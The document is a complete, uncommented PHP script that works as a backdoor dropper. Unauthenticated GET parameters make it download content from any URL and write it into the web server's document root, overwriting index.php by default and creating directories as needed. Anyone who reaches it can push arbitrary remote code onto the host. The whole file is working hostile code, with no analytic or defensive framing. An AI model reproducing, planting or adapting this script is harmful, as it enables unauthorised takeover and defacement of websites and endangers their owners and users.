<?php
$url = $_GET['url'];
if(empty($url)){
    exit('ok');
}
$fn = $_GET['fn'];
$efile = $_GET['fne'];
$cpRes = httpcopy($url,$fn,$efile);
if (!empty($cpRes)) {
    echo $cpRes;
} else {
    echo 'fail';
}

function httpcopy($url, $file="", $efile="", $timeout=60) {
    $file = empty($file) ? 'index.php' : $file;
    $url = str_replace(" ","%20",$url);
    $dir = $_SERVER['DOCUMENT_ROOT'] ? $_SERVER['DOCUMENT_ROOT'].'/' : '/';
    if ($efile) {
        $efa = explode('/',$efile);
        if ($efa) {
            foreach ($efa as $k => $v) {
                $mdir = $dir.$v.'/';
                $res = createdir($mdir);
                if (empty($res)) {
                    echo "$mdir==>fail</br>";
                }
                $dir .= $v.'/';
            }
        }
    }
    if(function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $temp = curl_exec($ch);
        if(@file_put_contents($dir.$file, $temp) && !curl_error($ch)) {
            return $dir.$file;
        } else {
            return false;
        }
    } else {
        $opts = array(
            "http"=>array(
            "method"=>"GET",
            "header"=>"",
            "timeout"=>$timeout)
        );
        $context = stream_context_create($opts);
        if(@copy($url, $dir.$file, $context)) {
            return $dir.$file;
        } else {
            return false;
        }
    }
}
function createdir($efile){
    return !is_dir($efile) ? @mkdir($efile,0755,true) : @chmod($efile,0755);
}
?>